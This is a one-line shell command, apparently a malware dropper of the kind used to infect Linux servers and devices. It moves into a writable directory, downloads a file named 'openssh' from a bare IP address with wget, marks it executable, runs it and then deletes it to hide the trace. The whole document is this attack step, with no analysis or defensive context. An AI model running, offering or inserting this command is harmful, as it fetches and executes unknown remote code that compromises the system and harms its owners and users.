cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.169/openssh; chmod +x openssh; ./openssh; rm -rf openssh
